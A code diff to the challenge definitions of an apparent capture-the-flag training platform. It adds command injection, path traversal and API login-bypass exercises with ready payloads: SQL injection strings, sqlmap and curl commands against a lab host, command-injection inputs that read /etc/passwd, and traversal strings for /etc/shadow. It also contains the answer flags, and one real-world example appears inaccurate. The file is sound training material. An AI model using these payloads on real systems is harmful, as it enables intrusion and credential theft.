@@ -17,22 +17,22 @@ def init_challenges():
             'description': 'Classic SQL Injection in a login form allowing authentication bypass.',
             'how_to_execute': 'Follow the step-by-step execution steps listed in `execution_steps`.',
             'execution_steps': [
-                'Open a browser and navigate to the target login page (e.g. http://192.168.1.10/login).',
+                'Open a browser and navigate to the target login page using the link below.',
                 "Inspect the login form to confirm the POST parameters (usually 'username' and 'password').",
                 "In the username field enter:  ' OR '1'='1  and enter any password (or leave blank).",
                 'Submit the form and observe whether you are authenticated as a user (often the first user, e.g., admin).',
                 'If the above fails, try terminating and commenting the rest of the query:  admin\'--  or  \' OR \"1\"=\"1\"--',
                 'Use an intercepting proxy (Burp) to replay and modify requests, or run sqlmap to confirm and enumerate the database.',
-                'Locate the flag in the profile or admin area after successful login (e.g., /admin or /profile).'
+                'Locate the flag in the profile or admin area after successful login.'
             ],
             'commands': (
                 "# Manual: try payloads in the username field\n"
                 "' OR '1'='1\n"
                 "admin'--\n"
                 "\n# Curl example to reproduce login POST:\n"
-                "curl -s -X POST 'http://192.168.1.10/login' -d 'username=\' OR \'1\'=\'1\'&password=test' -L\n"
+                "curl -s -X POST 'http://10.0.2.7:8080/login' -d 'username=\' OR \'1\'=\'1\'&password=test' -L\n"
                 "\n# Automated testing with sqlmap (confirm first with proxy/interception):\n"
-                "sqlmap -u 'http://192.168.1.10/login' --data 'username=__USER__&password=__PASS__' --level=3 --risk=2 --batch"
+                "sqlmap -u 'http://10.0.2.7:8080/login' --data 'username=__USER__&password=__PASS__' --level=3 --risk=2 --batch"
             ),
             'tools': [
                 'Browser (Chrome/Firefox) with Developer Tools',
@@ -48,6 +48,7 @@ def init_challenges():
             ),
             'difficulty': 'Easy',
             'category': 'Web Security',
+            'target_url': 'http://10.0.2.7:8080/login',
             'points': 100,
             'vm_name': 'web-server-1',
             'target_ip': '192.168.1.10',
@@ -98,6 +99,7 @@ def init_challenges():
             'vm_name': 'web-server-2',
             'target_ip': '192.168.1.11',
             'flag': 'FLAG{xss_attack_success_456}',
+            'target_url': 'http://10.0.2.7:8080/search',
             'hints': (
                 "1. Look for search fields, comment sections, or URL parameters that reflect input\n"
                 "2. The application doesn't properly encode special characters in the response\n"
@@ -142,6 +144,7 @@ def init_challenges():
             'vm_name': 'network-monitor',
             'target_ip': '192.168.1.20',
             'flag': 'FLAG{packet_analysis_789}',
+            'target_url': 'http://10.0.2.7:8080',
             'hints': (
                 "1. Look for HTTP traffic first as it's often in plaintext\n"
                 "2. Check for file uploads/downloads in the traffic\n"
@@ -388,6 +391,157 @@ def init_challenges():
                 "2. Try different HTML event handlers: onmouseover, onerror, onload\n"
                 "3. The WAF might not normalize input consistently\n"
                 "4. The flag is in an admin cookie that you need to exfiltrate"
+            )
+        },
+        {
+            'name': 'Command Injection',
+            'description': 'Inject system commands through user input in a vulnerable application to execute arbitrary code and retrieve the flag.',
+            'how_to_execute': 'Use special shell characters to break out of the intended command and execute your own commands.',
+            'execution_steps': [
+                'Open the target application at the provided URL.',
+                'Locate an input field that accepts user input (e.g., hostname, filename, username).',
+                'Try injecting special characters: ; | && || ` $ ()',
+                'If the application executes your injected command, you\'ve found a command injection vulnerability.',
+                'Use payloads like `whoami`, `id`, `cat /etc/passwd` to test execution.',
+                'Once confirmed, use `ls`, `find`, or `grep` to locate the flag file.',
+                'Read the flag file with `cat` or similar commands.'
+            ],
+            'commands': (
+                "# Test command injection in input fields\n"
+                "localhost; whoami\n"
+                "localhost && id\n"
+                "localhost | cat /etc/passwd\n"
+                "localhost || echo 'Command Injection'\n"
+                "localhost `id`\n"
+                "localhost $(whoami)\n"
+                "\n# Once confirmed, find and read the flag:\n"
+                "find / -name '*flag*' 2>/dev/null\n"
+                "cat /tmp/flag.txt\n"
+            ),
+            'tools': [
+                'Browser',
+                'Burp Suite',
+                'curl or wget',
+                'echo (for constructing payloads)'
+            ],
+            'real_world_use': (
+                "Command injection vulnerabilities are critical and have been exploited in numerous attacks. In 2019, researchers "
+                "discovered command injection in popular IoT devices and network equipment, allowing remote code execution. "
+                "The Bash vulnerability (ShellShock) in 2014 exploited command injection in CGI scripts, affecting millions of servers. "
+                "Security teams use these same techniques to identify injection points and prevent unauthorized system access."
+            ),
+            'difficulty': 'Medium',
+            'category': 'Web Security',
+            'points': 175,
+            'vm_name': 'web-server-3',
+            'target_ip': '192.168.1.30',
+            'flag': 'FLAG{command_injection_exec_222}',
+            'target_url': 'http://10.0.2.7:8080/ping',
+            'hints': (
+                "1. Try entering `; id` at the end of normal input\n"
+                "2. Use pipe (|) to chain commands: `localhost | whoami`\n"
+                "3. Try command substitution with backticks or $()\n"
+                "4. The flag file might be in /tmp or the home directory"
+            )
+        },
+        {
+            'name': 'Path Traversal - Local File Inclusion',
+            'description': 'Exploit path traversal vulnerability to access files outside the intended directory and retrieve sensitive information including the flag.',
+            'how_to_execute': 'Use directory traversal sequences to navigate the file system and read protected files.',
+            'execution_steps': [
+                'Open the target application file viewer or download functionality.',
+                'Try accessing files outside the intended directory using `../` sequences.',
+                'Test payloads like `../../../etc/passwd` to escape the intended directory.',
+                'If successful, you can read sensitive files like configuration files, source code, or password files.',
+                'Use variations like `....//`, `..\`, or Unicode encoding if basic traversal is blocked.',
+                'Locate and read the flag file (might be in /tmp, /home, or application root).',
+                'Some systems might have the flag in predictable locations like `/flag`, `/var/www/flag`, etc.'
+            ],
+            'commands': (
+                "# Basic path traversal payloads\n"
+                "../../../etc/passwd\n"
+                "....//....//....//etc/shadow\n"
+                "%2e%2e%2f%2e%2e%2fetc%2fpasswd  # URL encoded\n"
+                "/etc/hostname\n"
+                "/tmp/flag.txt\n"
+                "\n# When used in URL:\n"
+                "?file=../../../etc/passwd\n"
+                "?page=../../etc/shadow\n"
+            ),
+            'tools': [
+                'Browser',
+                'Burp Suite',
+                'curl',
+                'strings (for analyzing binary files)'
+            ],
+            'real_world_use': (
+                "Path traversal (directory traversal) is a common vulnerability that allows attackers to read arbitrary files. "
+                "In 2020, researchers found path traversal in multiple web frameworks allowing access to source code and configuration files. "
+                "In 2018, CVE-2018-7602 in Drupal used path traversal to achieve remote code execution. These vulnerabilities often lead to "
+                "information disclosure, privilege escalation, and complete system compromise if configuration files are exposed."
+            ),
+            'difficulty': 'Easy',
+            'category': 'Web Security',
+            'points': 150,
+            'vm_name': 'web-server-4',
+            'target_ip': '192.168.1.40',
+            'flag': 'FLAG{path_traversal_accessed_333}',
+            'target_url': 'http://10.0.2.7:8080/files',
+            'hints': (
+                "1. Try entering `../../../etc/passwd` in the filename field\n"
+                "2. The application might strip `../` so try `....//` or double encoding\n"
+                "3. Test accessing `/etc/hostname` to confirm the vulnerability works\n"
+                "4. The flag might be in /tmp or a custom directory"
+            )
+        },
+        {
+            'name': 'Authentication Bypass - API Exploitation',
+            'description': 'Bypass authentication in an API endpoint using SQL injection or weak authentication logic to access admin functionality and retrieve the flag.',
+            'how_to_execute': 'Exploit weak authentication checks in API endpoints to gain unauthorized access.',
+            'execution_steps': [
+                'Identify the API endpoint that handles authentication (typically /api/login or /login).',
+                'Test for SQL injection in the username/password fields using `\' OR \'1\'=\'1`.',
+                'Try sending requests with JSON payloads to the API endpoint.',
+                'Monitor the API response for tokens, session cookies, or direct flag disclosure.',
+                'If SQL injection fails, try boolean-based blind attacks or timing-based attacks.',
+                'Use tools like SQLMap to automate testing: `sqlmap -u http://target/api/login --data={"username":"test"}...`',
+                'Once authenticated, access admin areas or protected resources to find the flag.'
+            ],
+            'commands': (
+                "# Test basic SQL injection\n"
+                "curl -X POST 'http://10.0.2.7:8080/api/login' \\\n"
+                "  -H 'Content-Type: application/json' \\\n"
+                "  -d '{\"username\":\"\\' OR \\\"1\\\"=\\\"1\",\"password\":\"test\"}'\n"
+                "\n# URL-encoded variant\n"
+                "curl -X POST 'http://10.0.2.7:8080/api/login' \\\n"
+                "  -d 'username=\\' OR \\'1\\'=\\'1&password=test'\n"
+                "\n# Using Burp Repeater or SQLMap:\n"
+                "sqlmap -u 'http://10.0.2.7:8080/api/login' --data 'username=test&password=test' --batch\n"
+            ),
+            'tools': [
+                'curl or Postman',
+                'Burp Suite',
+                'SQLMap',
+                'OWASP ZAP'
+            ],
+            'real_world_use': (
+                "API authentication bypass vulnerabilities have led to major breaches. In 2019, a simple authentication bypass in an API "
+                "allowed attackers to access user data across multiple applications. The OWASP Top 10 consistently ranks broken authentication "
+                "and API vulnerabilities as critical. Many companies have faced data breaches due to weak or missing API authentication checks. "
+                "Security teams regularly test APIs for authentication and authorization flaws to prevent unauthorized access."
+            ),
+            'difficulty': 'Medium',
+            'category': 'Web Security / API Security',
+            'points': 200,
+            'vm_name': 'api-server',
+            'target_ip': '192.168.1.50',
+            'flag': 'FLAG{auth_bypass_api_success_444}',
+            'target_url': 'http://10.0.2.7:8080/auth-challenge',
+            'hints': (
+                "1. The API endpoint is vulnerable to SQL injection in the authentication check\n"
+                "2. Try the payload: `\\' OR \\'1\\'=\\'1` in the username field\n"
+                "3. Admin account credentials might be returned in the JSON response\n"
+                "4. The flag is in the admin user response after successful bypass"
             )
         },
         {
